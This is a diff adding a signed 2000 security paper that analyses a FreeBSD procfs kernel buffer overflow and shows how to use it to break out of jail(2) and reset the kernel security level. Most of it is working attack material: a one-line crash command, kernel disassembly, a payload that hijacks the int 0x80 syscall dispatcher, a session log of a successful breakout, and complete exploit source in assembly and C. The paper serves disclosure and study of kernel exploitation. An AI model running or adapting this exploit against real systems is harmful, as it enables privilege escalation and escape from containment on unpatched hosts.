@@ -1,0 +1,928 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+
+            Exploiting Kernel Buffer Overflows FreeBSD Style:
+          Defeating Security Levels and Breaking Out of Jail(2)
+                             Esa Etelavuori
+                           December 28,  2000
+
+1. Introduction
+
+This is a detailed case study discussing the exploitation of the FreeBSD
+kernel process filesystem buffer overflow vulnerability [7]. This is
+FreeBSD/i386 specific, but some of these techniques are applicable
+to other systems, and perhaps give a new insight to regular buffer
+overflows.
+
+There is not much public information about this subject, although a
+search for kernel buffer overflows reveals some interesting cases.
+Silvio Cesare's kmem patching article [1] is a good basis. Knowledge
+of the FreeBSD kernel implementation [5, 6], and the IA-32 architecture
+[2] would be useful. See the FreeBSD manual pages of jail(8) and init(8)
+for a description of the jail mechanism and security levels.
+
+2. Vulnerability Analysis
+
+It is essential to have a good understanding of the vulnerability when
+exploiting kernel space holes, because we are likely to have only one
+try as mistakes result in a system crash.
+
+2.1 Understanding the Vulnerability
+
+4.4BSD procfs implementation has been broken since the beginning, but
+the final blow came from jail(2). The buffer overflow happens when a
+jail has been setup with a long hostname (up to 255 bytes) or huge gids
+are used, and a program's status is read through procfs.
+
+Procfs status information looks like this:
+# cat /proc/curproc/status
+cat 60424 60386 60424 60386 5,0 ctty 972854153,236415 0,0 0,1043\
+nochan 0 0 0,0 prisoner
+
+Fields are:
+comm pid ppid pgid sid  maj,min ctty,sldr start     user/system time\
+wmsg euid ruid rgid,egid,groups[1 .. NGROUPS] jail's hostname
+
+Vulnerable kernel can be crashed like this:
+# jail / `perl -e 'print "x" x 250'` 1.2.3.4 /bin/cat /proc/curproc/status
+
+Here is the actual culprit, src/sys/miscfs/procfs/procfs_status.c:
+
+int
+procfs_dostatus(curp, p, pfs, uio)
+    struct proc *curp;
+    struct proc *p;
+<snip>
+    char *ps;
+<snip>
+    int xlen;
+    int error;
+    char psbuf[256];                /* XXX - conservative */
+<snip>
+    ps = psbuf;
+<...snip>
+    for (i = 0; i < cr->cr_ngroups; i++)
+        ps += sprintf(ps, ",%lu", (u_long)cr->cr_groups[i]);
+
+    if (p->p_prison)
+        ps += sprintf(ps, " %s", p->p_prison->pr_host);
+    else
+        ps += sprintf(ps, " -");
+    ps += sprintf(ps, "\n");
+
+    xlen = ps - psbuf;
+    xlen -= uio->uio_offset;
+    ps = psbuf + uio->uio_offset;
+    xlen = imin(xlen, uio->uio_resid);
+    if (xlen <= 0)
+        error = 0;
+    else
+        error = uiomove(ps, xlen, uio);
+
+    return (error);
+}
+
+Basic mistakes, but even the jail overflow has been in the FreeBSD
+source tree for over 18 months.
+
+Psbuf is declared as the last local variable that seems to cause
+problems (that we could overcome) because ps would get overwritten.
+Further investigation is needed to see what kind of code the compiler
+has generated with default optimizations (-O).
+
+# nm /kernel | grep "T procfs_dostatus"
+c0170d64 T procfs_dostatus
+# objdump -d /kernel --start-address=0xc0170d64 | less
+<snip>
+c0170d64 <procfs_dostatus>:
+c0170d64:       55                      push   %ebp
+c0170d65:       89 e5                   mov    %esp,%ebp
+c0170d67:       81 ec 24 01 00 00       sub    $0x124,%esp
+c0170d6d:       57                      push   %edi
+c0170d6e:       56                      push   %esi
+c0170d6f:       53                      push   %ebx
+c0170d70:       8b 45 14                mov    0x14(%ebp),%eax
+<snip>
+        ps += sprintf(ps, "\n");
+c017100c:       68 cb 0d 24 c0          push   $0xc0240dcb
+c0171011:       56                      push   %esi
+c0171012:       e8 21 62 fd ff          call   c0147238 <sprintf>
+c0171017:       01 c6                   add    %eax,%esi
+        xlen = ps - psbuf;
+c0171019:       8d 95 00 ff ff ff       lea    0xffffff00(%ebp),%edx
+c017101f:       89 f1                   mov    %esi,%ecx
+c0171021:       29 d1                   sub    %edx,%ecx
+
+Ps is optimized to use %esi and psbuf is at the top of the stack frame
+(referenced as -256(%ebp)).
+
+After disassembling GENERIC kernels and compiling new ones with different
+optimization settings using GCC coming with FreeBSD releases, it seems
+that the above code can be considered as a safe default to base the
+exploitation process on.
+
+2.2 Taking Control of the Processor
+
+When exploiting the overflow by using gids, we have a very constrained
+character set to use. The overflow ends with '\n\0' so only limited
+addresses can be reached. We would need to be lucky to reach suitable
+code. However, we can reach the current program's stack with a one-byte
+frame pointer overflow [3, 4] and other data areas with a two-byte
+overflow. We can read the top of our process' kernel space stack from
+p->p_md.md_regs, which is at the top of a two-page user area.
+
+I do not know a simple method for filling reachable areas with our
+data, but brute forcing by filling user-controlled areas with a fake
+stack frame (only a dummy fp and a saved program counter are needed),
+executing several programs, and searching for the right data by reading
+kmem works and can be automated. Apparently space used for argument
+copies is reachable and static enough to be usable with the two-byte
+overflow. This could be used to break securelevels on other BSDs,
+as well.
+
+But what happens if the kernel has been compiled without using a
+frame pointer? Looking at the source again, we can see that curp and p
+arguments, which are just above the saved return address, are not used
+after the overflow. This means that we can pad the overflowing hostname
+with two return addresses, and if a frame pointer is not used, the second
+one trashes curp and trailing '\n\0' trashes p, which is still safe.
+
+Now we can be pretty sure that we can control the program flow. There
+are endless ways how to continue exploitation from here. The "right"
+approach depends on the situation, and every open source kernel can
+be different. The following example is meant to illustrate some points
+when playing with the kernel, and not to be an optimal exploit.
+
+3. Payload Creation
+
+Our goal is to break out of jail and reset the security level to insecure
+state. We can escape jail by zeroing our process' jail pointer. The
+process flags still contain indication of jail, but it does not matter
+as the main checks look for validity of the jail pointer. The process'
+root directory can be set to the system root, bypassing chroot(2) used
+by jail(2). We can reset the security level by writing a value below
+1 to the address of the securelevel variable (signed int).
+
+We need to get exact addresses of variables we want to access. Even
+in most basic jail installation /kernel and /dev/{mem,kmem} probably
+are links to /dev/null, so exact addresses cannot be read using
+them. However, the FreeBSD kernel gives out all needed symbol table
+information to anyone through kldsym(2), which can be easily used via
+the kvm(3) library.
+
+3.1 Payload Execution
+
+We can redirect the program flow by stopping a dummy process so its
+status information does not change, use it to calculate the exact
+length of a new hostname containing the payload, set the hostname,
+and read the status again.
+
+We could reach the payload by calculating the approximate distance from
+the top of the stack to the buffer filled with NOPs. But we can locate
+the exact address by reading the prison structure's location from our
+own process structure via kvm(3), which uses KERN_PROC sysctl(3). If
+we had not been jailed, we could have used the kernel MIB for data
+transfers from user to kernel space.
+
+3.2 Payload Exit
+
+What do we do after the payload has been triggered? The running program
+could be forced to terminate, but that could cause unexpected side
+effects due to it being in kernel space. The program could be holding
+locks (procfs lock in this case) and other resources that should be
+released. The safest way is to resume execution as if nothing unusual
+had occurred. There happens just a few byte side step.
+
+The problem is that we do not know exactly where to return if we
+cannot read the kernel code before attack. We could let the payload
+scan for a call to procfs_dostatus() to calculate the return address
+at run-time. However, the frame pointer might also need adjusting,
+and we cannot be certain that it is done right.
+
+We could rely on a common case again, but if we have survived up to
+this point, we do not want to fail now. We can put the program to sleep
+after the payload has been triggered. When we get out of the jailed
+environment, we can adjust the frame pointer and the return address
+correctly, and signal the program to continue its trip safely back to
+user space.
+
+We can tune the payload for the common case, so that the overwritten
+frame pointer is set to a usually correct value at run-time by using
+the stack pointer, and calculating the difference with the help of
+disassembly of the previous function, procfs_rw. This can be fixed /
+NOPped out later if needed.
+
+3.3 The Gate to Freedom
+
+Because we have stopped the process that is under our control, we cannot
+modify its attributes to escape jail. We have to modify some other
+process. The process structure has a pointer to its parent, we could use
+that. We could modify the system call table, system calls, and almost
+anything else. Plenty of possibilities, but perhaps the neatest way
+is to hijack the whole system call dispatcher, the famous int 0x80. We
+could modify its Trap Gate descriptor in the Interrupt Descriptor Table,
+but let's look at the code, src/sys/i386/i386/exception.s:
+
+/*
+ * Call gate entry for FreeBSD ELF and Linux/NetBSD syscall (int 0x80)
+ *
+ * Even though the name says 'int0x80', this is actually a TGT (trap gate)
+ * rather then an IGT (interrupt gate).  Thus interrupts are enabled on
+ * entry just as they are for a normal syscall.
+ *
+ * We do not obtain the MP lock, but the call to syscall2 might.  If it
+ * does it will release the lock prior to returning.
+ */
+        SUPERALIGN_TEXT
+IDTVEC(int0x80_syscall)
+        subl    $8,%esp            /* skip over tf_trapno and tf_err */
+        pushal
+        pushl   %ds
+        pushl   %es
+        pushl   %fs
+        mov     $KDSEL,%ax              /* switch to kernel segments */
+        mov     %ax,%ds
+        mov     %ax,%es
+        MOVL_KPSEL_EAX
+        mov     %ax,%fs
+        movl    $2,TF_ERR(%esp)         /* sizeof "int 0x80" */
+        FAKE_MCOUNT(13*4(%esp))
+        MPLOCKED incl _cnt+V_SYSCALL
+        call    _syscall2
+        MEXITCOUNT
+        cli                             /* atomic astpending access */
+        cmpl    $0,_astpending
+        je      doreti_syscall_ret
+<snip>
+
+It saves all user registers on the stack, loads kernel selectors,
+and calls the actual handler, syscall2. That is fine for us. KDSEL
+is a data segment selector that covers the entire address range with
+read-write access. KPSEL is a per-cpu private selector that is important
+on multiprocessor machines to locate certain structures such as the
+current process. We can simply let the payload scan for the call to
+syscall2 and replace it with a pointer to our code that will jump to
+the real syscall2 or return after it has done what we want.
+
+What we want is to escape jail so we will check in our patched syscall
+handler for a particular system call number, and patch a process pointed
+by the %fs:gd_curproc variable, which is the process that called us. When
+we want to get out of jail, we will call our new system call that does
+not even exist if you look at original system calls or use ktrace(1),
+because ktracing is implemented in syscall2.
+
+This can be risky in many ways. A simple scan for the right call
+opcode could fail if there happens to be another similar byte, but
+int0x80_syscall has been stable, so it should not be a problem. This
+small cross-modifying code and process modifications should work on
+MP machines without further locking. Blocking interrupts and getting
+extra locks take only a few bytes, though.
+
+3.4 Other Considerations
+
+This approach uses many symbols that increases possibility of zero
+bytes in addresses. Most likely it does not matter, because the payload
+can be easily modified and its position can be varied as needed. We
+could embed NUL bytes by constructing the hostname in several phases,
+and adjusting the overflow length with gids as needed. But we will
+add a standard XOR decoder to have more features.
+
+When the last process within a jail exits, its prison structure is
+normally destroyed. Our zeroing of the prison pointer does not modify the
+prison reference count, so the memory for the payload stays allocated.
+
+4. Conquering Kernel Space
+
+It is time to put the exploit to action.
+
+<snip>
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel), 65534(nobody)
+# uname -sr
+FreeBSD 4.1.1-RELEASE
+# hostname
+alcatraz.n3t
+# pwd
+/tmp
+# sysctl -w kern.securelevel=0
+kern.securelevel: 3
+sysctl: kern.securelevel: Operation not permitted
+# ipfw add 1 allow ip from any to any
+ipfw: socket: Operation not permitted
+# # Locks seem to be working, but not for long.
+# ./e
+prison name      @ 0xc0de8404
+payload len      = 136
+decoder skip     @ 0xc0de8415
+Xint0x80_syscall @ 0xc021b120
+new syscall2     @ 0xc0de844d
+tsleep           @ 0xc01431cc
+hostname         @ 0xc029fba0
+syscall2         @ 0xc0226f4c
+gd_curproc       @ 0xc0282160
+rootvnode        @ 0xc02a0224
+securelevel      @ 0xc0270884
+procfs_rw        @ 0xc01743e4
+payload ret fix  @ 0xc0de844d
+>>> ok? y
+# pwd
+/jail/10.9.8.7/tmp
+# sysctl kern.securelevel
+kern.securelevel: -1
+# ipfw add 1 allow ip from any to any
+00001 allow ip from any to any
+# ipfw -a l | head -1
+00001  645  307084 allow ip from any to any
+# hostname
+paperbag.c0m
+# ps -opid,ppid,stat,wchan,flags,ucomm -t`tty`
+  PID  PPID STAT WCHAN        F UCOMM
+10908 10907 IsJ  wait   1004086 sh
+10929 10908 IJ   wait   1004086 sh
+10936 10929 IJ   wait   1004086 e
+10937 10936 TJ   -      1001006 e
+*0938 10936 DJ   paperb 1000006 e
+10939 10936 I    wait      4086 sh
+10940 10939 S    wait      4086 sh
+10950 10940 R+   -         4006 ps
+# # Nice. New forked processes have no J(ail) flag. We can also
+# # see that pid *0938 has the hostname as its wait message.
+# objdump -d /kernel --start-address=0xc01743e4 | less
+<snip>
+c01743e4 <procfs_rw>:
+c01743e4:       55                      push   %ebp
+c01743e5:       89 e5                   mov    %esp,%ebp
+c01743e7:       83 ec 08                sub    $0x8,%esp
+c01743ea:       57                      push   %edi
+c01743eb:       56                      push   %esi
+c01743ec:       53                      push   %ebx
+c01743ed:       8b 45 08                mov    0x8(%ebp),%eax
+<...snip>
+c01744ef:       e8 40 f8 ff ff          call   c0173d34 <procfs_dostatus>
+c01744f4:       eb 4e                   jmp    c0174544 <procfs_rw+0x160>
+<snip>
+# # Looks like a common case so %ebp is correct and just the return
+# # address needs modification. /kernel could be a fake, but let's silence
+# # our paranoia for a while. After all, this is just a simple demo.
+# dd if=/dev/kmem skip=0xc0de844d bs=1 count=4 2>/dev/null | hexdump -C
+00000000  ba dc 0d e5                                       |....|
+00000004
+# # That's the return address.
+# perl -e 'print chr 0x44, chr 0x45, chr 0x17, chr 0xc0' | \
+> dd of=/dev/kmem seek=0xc0de844d bs=1 count=4 2>/dev/null
+# dd if=/dev/kmem skip=0xc0de844d bs=1 count=4 2>/dev/null | hexdump -C
+00000000  44 45 17 c0                                       |DE..|
+00000004
+# # Now we can inform our sleeping process in the kernel.
+# h=`hostname` && hostname X && sleep 5 && hostname $h
+# ps -opid,ppid,stat,wchan,flags,ucomm -t`tty`
+  PID  PPID STAT WCHAN        F UCOMM
+10908 10907 IsJ  wait   1004086 sh
+10929 10908 IJ   wait   1004086 sh
+10936 10929 IJ   wait   1004086 e
+10937 10936 TJ   -      1001006 e
+10938 10936 ZJ   -      1002006 e
+10939 10936 I    wait      4086 sh
+10940 10939 S    wait      4086 sh
+10992 10940 R+   -         4006 ps
+# # Yep, the kid got safely out of the kernel just to become a zombie. ;]
+
+Now the intruder is free to build a new base into the kernel.
+
+5. Conclusions
+
+Exploiting kernel space buffer overflows is similar to user space holes,
+but we have to be more careful, and understand the vulnerability and
+the system better. The ability to execute arbitrary code using the most
+privileged processor mode in a flat kernel makes everything possible,
+and is the ultimate technical weapon for intruders.
+
+In this case the kernel buffer overflow has turned out to be quite
+easy to exploit due to helpful cooperation from the kernel. Even if
+we did not have symbol table information and a binary-only kernel,
+we might be able to copy it or an equivalent version to a laboratory
+machine for extra analysis and testing.
+
+Most operating systems do not even try to offer this much protection.
+Given the sad state of computer security, perhaps the only trustworthy
+solution is to use open source systems. Although verifying them is
+impossible, a skilled defender has more possibilities to harden the
+kernel and prepare for eventual failure of prevention. Adding non-obvious
+auditing mechanisms might help to detect attackers who do fairly decent
+kernel modifications and disable normal protection mechanisms.
+
+Acknowledgments
+
+Thanks to Andrew R. Reiter for reviewing and commenting this paper, and
+Pascal Bouchareine for a multiprocessor machine and comments.
+
+Greets to Jouko Pynnonen, and the Hacker Emergency Response Team.
+
+References
+
+[1] Cesare, Silvio, "RUNTIME KERNEL KMEM PATCHING," November 1998.
+    http://www.big.net.au/~silvio/runtime-kernel-kmem-patching.txt
+[2] Intel, The IA-32 Intel Architecture Software Developer's Manual,
+    Volumes 1-3. http://developer.intel.com/design/litcentr/index.htm
+[3] Kirch, Olaf., "The poisoned NUL byte", Bugtraq mailing list,
+    October 1998. http://www.securityfocus.com/archive/1/10884
+[4] Klog, "The Frame Pointer Overwrite," Phrack Magazine, October 1999,
+    Vol. 9, No. 55.
+    http//phrack.infonexus.com/search.phtml?view&article=p55-8
+[5] McKusick, Marshall Kirk et al, The Design and Implementation of
+    the 4.4BSD Operating System, Addison-Wesley, Reading, MA, 1996.
+[6] The FreeBSD Project, The FreeBSD 4 kernel source code.
+    http://www.FreeBSD.org/cgi/cvsweb.cgi/src/sys/
+[7] The FreeBSD Project, "Several vulnerabilities in procfs,"
+    FreeBSD Security Advisory: FreeBSD-SA-00:77, December 2000.
+ftp://ftp.freebsd.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-00:77.procfs.asc
+
+Appendix A - Exploit
+
+/* freesploit.S
+ * FreeBSD/i386 4.0-4.1.1 jail(2) break & security level exploit (procfs)
+ */
+#include "freesploit.h"
+
+.globl    payload
+.globl    payload_end
+.globl    new_syscall2
+
+#ifdef XOR_PAYLOAD
+.globl    decoder_end
+.equ      XOR_LEN, payload_end - decoder_end
+#endif
+
+payload:
+    push %eax
+
+#ifdef XOR_PAYLOAD
+    push %ecx
+decoder:
+    mov  $SYM_MARKER,%eax    //p->prison->name + decoder skip
+    xor  %ecx,%ecx
+    movb $XOR_LEN,%cl
+xor_loop:
+    xorb $XOR_CHAR,(%eax)
+    inc  %eax
+    loop xor_loop
+decoder_end:
+#endif
+
+syscall_patcher:
+#ifndef XOR_PAYLOAD
+    push %ecx
+#endif
+    mov  $SYM_MARKER,%eax    //Xint0x80_syscall
+call_scan:
+    inc  %eax
+    cmpb $0xe8,(%eax)        //call opcode
+    jne  call_scan
+
+    mov  $SYM_MARKER,%ecx    //new syscall - 5 (call len)
+    sub  %eax,%ecx           //relative call len
+    xchg %ecx,1(%eax)        //atomic
+
+tsleeper:
+    push %ebx
+sleep_again:
+    mov  $SYM_MARKER,%ecx    //tsleep
+    mov  $SYM_MARKER,%ebx    //hostname
+    push $0x2
+    push %ebx
+    push $0x2
+    push %ebx
+    call *%ecx
+    add  $0x10,%esp
+    cmpb $0x58,(%ebx)        //XXX
+    jne  sleep_again
+
+    pop  %ebx
+    pop  %ecx
+    pop  %eax
+
+fp_fix:
+    lea  FP_ADD(%esp),%ebp
+
+payload_ret_fix:
+    push $0xe50ddcba
+    ret
+
+new_syscall2:
+// %esp -> saved %eip, trapframe
+    cmpw $NEW_SYSCALL,TF_EAX+4(%esp)
+    je   breakout
+
+    push $SYM_MARKER        //syscall2
+    ret
+
+breakout:
+    push %eax
+    push %ebx
+    push %ecx
+
+    mov  %fs:(SYM_MARKER),%ecx //gd_curproc
+//p->p_fd->fd_rdir = rootvnode
+    mov  (SYM_MARKER),%eax     //rootvnode
+    mov  P_FD(%ecx),%ebx
+    mov  %eax,FD_RDIR(%ebx)    //XXX
+
+//p->p_prison = NULL
+    xor  %eax,%eax
+    pushw %ax
+    pushw $P_PRISON
+    pop  %ebx
+    mov  %eax,(%ebx,%ecx)     //XXX
+
+//seclvl_reset
+    dec  %eax
+    mov  %eax,SYM_MARKER      //securelevel XXX
+
+    pop  %ecx
+    pop  %ebx
+    pop  %eax
+
+    ret
+
+payload_end:
+.byte 0
+
+/* freesploit.c
+ * FreeBSD/i386 4.0-4.1.1 jail(2) break & security level exploit (procfs)
+ * by Esa Etelavuori (http://www.iki.fi/ee/) in 2000.
+ *
+ * This program is free software; you can modify it as much
+ * you want, claim it is yours, steal it, sell it for billions,
+ * and use it to mess your life, but do not bother anyone else.
+ */
+#include <sys/param.h>
+#define  _KERNEL
+#include <sys/jail.h>
+#undef   _KERNEL
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/sysctl.h>
+#include <sys/time.h>
+#include <sys/wait.h>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <err.h>
+#include <fcntl.h>
+#include <kvm.h>
+#include <machine/frame.h>
+#include <nlist.h>
+#include <paths.h>
+#include <signal.h>
+#include <stddef.h>
+
+#include "freesploit.h"
+
+#define XBUF        512
+#define SYM_WIDTH  "-16"
+
+static pid_t stopper_kid = 0;
+static pid_t trigger_kid = 0;
+static kvm_t *kd = NULL;
+static struct kinfo_proc *kproc = NULL;
+static char orig_hname[MAXHOSTNAMELEN+1] = {0};
+
+struct kinfo_proc {
+    struct    proc kp_proc;
+};
+
+#define PRISON_HOST_ADDR() ((unsigned int)kproc->kp_proc.p_prison    \
+                             + offsetof(struct prison, pr_host))
+
+extern void payload(void);
+extern void payload_end(void);
+extern void new_syscall2(void);
+#ifdef XOR_PAYLOAD
+extern void decoder_end(void);
+#endif
+
+static void stopper(void);
+static void trigger(void);
+static void master(void);
+static void payloader(void);
+static void linker(char *);
+static void zero_check(int);
+static ssize_t get_stats_len(pid_t);
+static unsigned int get_sym(const char *);
+static void fix_payload_return(const char *);
+static void init_kvm(int);
+static void cleanup(void);
+
+int
+main(int ac, char **av)
+{
+    if (ac == 1)
+        master();
+    else if (ac == 2)
+        fix_payload_return(av[1]);
+
+    return 1;
+}
+
+static void
+stopper(void)
+{
+    kill(getpid(), SIGSTOP);
+    _exit(1);
+}
+
+static void
+trigger(void)
+{
+    get_stats_len(stopper_kid);
+    if (sethostname(orig_hname, strlen(orig_hname)))
+        perror("sethostname");
+    _exit(0);
+}
+
+static void
+master(void)
+{
+    int stats;
+
+    stopper_kid = fork();
+    if (stopper_kid < 0)
+        err(1, "fork");
+
+    if (!stopper_kid)
+        stopper();
+
+    atexit(cleanup);
+    init_kvm(O_RDONLY);
+
+    while (waitpid(stopper_kid, &stats, WUNTRACED)
+            && !WIFSTOPPED(stats))
+        ;
+
+    payloader();
+
+    trigger_kid = fork();
+    if (trigger_kid < 0)
+        err(1, "fork");
+
+    if (!trigger_kid)
+        trigger();
+
+    sleep(3);
+    syscall(NEW_SYSCALL, NULL);
+    system("/bin/sh");
+
+    exit(0);
+}
+
+static void
+payloader(void)
+{
+    unsigned int payload_addr;
+    ssize_t len;
+    char buf[XBUF];
+    char *p;
+
+    payload_addr = PRISON_HOST_ADDR();
+    printf("%"SYM_WIDTH"s @ %#08x\n", "prison name", payload_addr);
+    zero_check(payload_addr);
+
+    if (offsetof(struct proc, p_prison) != P_PRISON
+            || offsetof(struct proc, p_fd) != P_FD
+            || offsetof(struct filedesc, fd_rdir) != FD_RDIR
+            || offsetof(struct trapframe, tf_eax) != TF_EAX)
+        errx(1, "struct / define mismatch");
+
+    len = (char *)payload_end - (char *)payload;
+    printf("%"SYM_WIDTH"s = %d\n", "payload len", len);
+    if (len > sizeof(buf) - 1)
+        errx(1, "payload too big");
+
+    memcpy(buf, payload, len);
+
+    buf[len] = '\0';
+    linker(buf);
+
+    len = 256 - get_stats_len(stopper_kid);
+    len -= strlen(buf);
+    if (len < 0)
+        errx(1, "stats too long");
+
+    p = buf;
+    p += strlen(p);
+    while (len--)
+        *p++ = 'x';
+
+    for (len = 2; len--;) {
+        *(unsigned int *)p = payload_addr;
+        p += sizeof payload_addr;
+    }
+    *p = '\0';
+
+    if (sethostname(buf, strlen(buf)))
+        err(1, "sethostname");
+}
+
+static void
+linker(char *buf)
+{
+    unsigned int addr, new_syscall2_addr;
+    unsigned int i;
+    ssize_t len;
+    char *p;
+    const char *syms[] = {"decoder skip", "Xint0x80_syscall",
+        "new syscall2", "tsleep", "hostname", "syscall2",
+        "gd_curproc", "rootvnode", "securelevel", NULL};
+
+    new_syscall2_addr = PRISON_HOST_ADDR()
+        + ((char *)new_syscall2 - (char *)payload);
+    p = buf;
+#ifdef XOR_PAYLOAD
+    i = 0;
+#else
+    i = 1;
+#endif
+    for (len = (char *)payload_end - (char *)payload; len--; p++) {
+        if (*(unsigned int *)p == SYM_MARKER) {
+#ifdef XOR_PAYLOAD
+            if (i == 0) {
+                addr = PRISON_HOST_ADDR()
+                    + (char *)decoder_end - (char *)payload;
+                zero_check(addr); /* XXX */
+            }
+            else
+#endif
+            if (i == 2) /* - sizeof "call 0xbadc0de5" */
+                addr = new_syscall2_addr - 5;
+            else
+                addr = get_sym(syms[i]);
+
+            printf("%"SYM_WIDTH"s @ %#08x\n", syms[i], addr);
+
+#ifndef XOR_PAYLOAD
+            zero_check(addr);
+#endif
+
+            *(unsigned int *)p = addr;
+
+            if (syms[++i] == NULL)
+                break;
+        }
+    }
+
+#ifdef XOR_PAYLOAD
+    p = &buf[(char *)decoder_end - (char *)payload];
+    for (i = (char *)payload_end - (char *)decoder_end; i--;)
+        *p++ ^= XOR_CHAR;
+#endif
+
+    len = (char *)payload_end - (char *)payload;
+    if (len != strlen(buf))
+        errx(1, "payload len %d != strlen %d\n", len, strlen(buf));
+
+    printf("%"SYM_WIDTH"s @ %#08x\n", "procfs_rw", get_sym("procfs_rw"));
+    printf("%"SYM_WIDTH"s @ %#08x\n", "payload ret fix",
+        new_syscall2_addr - 5); /* XXX */
+
+    fprintf(stderr, ">>> ok? ");
+    if (getchar() != 'y')
+        exit(1);
+}
+
+static void
+zero_check(int addr)
+{
+    int i;
+
+    for (i = 0; i < 32; i += 8) {
+        if (!((addr >> i) & 0xff))
+               errx(1, "fix it\n");
+    }
+}
+
+static ssize_t
+get_stats_len(pid_t pid)
+{
+    int fd;
+    ssize_t n;
+    char buf[XBUF];
+
+    snprintf(buf, sizeof buf, "/proc/%d/status", pid);
+    if ((fd = open(buf, O_RDONLY)) == -1)
+        err(1, "proc open");
+    if ((n = read(fd, buf, sizeof buf)) < 10)
+        err(1, "proc read");
+    close(fd);
+
+    if (gethostname(buf, sizeof buf))
+        err(1, "gethostname");
+
+    if (*orig_hname == '\0')
+        snprintf(orig_hname, sizeof orig_hname, "%s", buf);
+
+    return n - 1 - strlen(buf);
+}
+
+static unsigned int
+get_sym(const char *s)
+{
+    struct nlist nl[2];
+
+    nl[0].n_name = (char *)s;
+    nl[1].n_name = NULL;
+    if (kvm_nlist(kd, nl))
+        err(1, "kvm_nlist");
+    return nl[0].n_value;
+}
+
+static void
+fix_payload_return(const char *s)
+{
+    FILE *fh;
+    unsigned int addr, ret_addr;
+    char cmd[XBUF];
+    const char *fmt = "/usr/bin/objdump -d --start-address=0x%x "
+                "--stop-address=0x%x /kernel | /usr/bin/grep -A1 "
+                "procfs_dostatus | /usr/bin/tail -1";
+
+    init_kvm(O_RDWR);
+    addr = get_sym("procfs_rw");
+
+    snprintf(cmd, sizeof cmd, fmt, addr, addr + 0x400);
+
+    if ((fh = popen(cmd, "r")) == NULL)
+        err(1, "popen");
+    if (fscanf(fh, "%x:", &ret_addr) != 1)
+        err(1, "fscanf");
+    pclose(fh);
+
+    addr = strtoul(s, NULL, NULL);
+    printf("ret %#08x @ %#08x\n", ret_addr, addr);
+
+    if (addr >> 24 < 0xc0 || ret_addr >> 24 < 0xc0)
+        errx(1, "non-k addr");
+
+    if (kvm_write(kd, addr, (void *)&ret_addr, sizeof ret_addr)
+            != sizeof ret_addr)
+        err(1, "kvm_write");
+}
+
+static void
+init_kvm(int flags)
+{
+    int cnt;
+    char *kp;
+
+    if (kd == NULL) {
+        kp = flags == O_RDONLY ? _PATH_DEVNULL: NULL;
+        kd = kvm_open(kp, kp, kp, flags, NULL);
+        if (kd == NULL)
+            err(1, "kvm_open");
+        kproc = kvm_getprocs(kd, KERN_PROC_PID, getpid(), &cnt);
+        if (kproc == NULL)
+            err(1, "kvm_getprocs");
+    }
+}
+
+static void
+cleanup(void)
+{
+    if (stopper_kid)
+        kill(stopper_kid, SIGKILL);
+    if (trigger_kid)
+        kill(trigger_kid, SIGKILL);
+    if (kd != NULL)
+        kvm_close(kd);
+}
+
+/* freesploit.h
+ * FreeBSD/i386 4.0-4.1.1 jail(2) break & security level exploit (procfs)
+ */
+#define NEW_SYSCALL         0x1337
+
+#define XOR_PAYLOAD
+#define XOR_CHAR            0x7f
+
+#define SYM_MARKER          0x41414141
+
+#define P_PRISON            0x160
+#define P_FD                0x14
+#define FD_RDIR             0xc
+
+#define FP_ADD              0x24
+
+#define TF_EAX              40
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.0.4 (DreamOS)
+Comment: http://www.iki.fi/ee/08C1E33D.asc
+
+iQCVAwUBOkuT01ZDrCkIweM9AQHIOQP/TbbFf8D2qZMnt7TeaUfn/yIL1D5NKsxz
+PAtpJb80XehtO4VXJBPFHIBqBwnAZpPQuCwBArlQkzhwWpn5GFtVpyOjmyhAvCui
+TFBCb9Dh0uVC4VDD3TZOPe4g/jBv7LyK/OSr3YSbR8XVWOaL13vY7CR5izPPIjAK
+rs7GDwAUmXE=
+=dnh7
+-----END PGP SIGNATURE-----
+
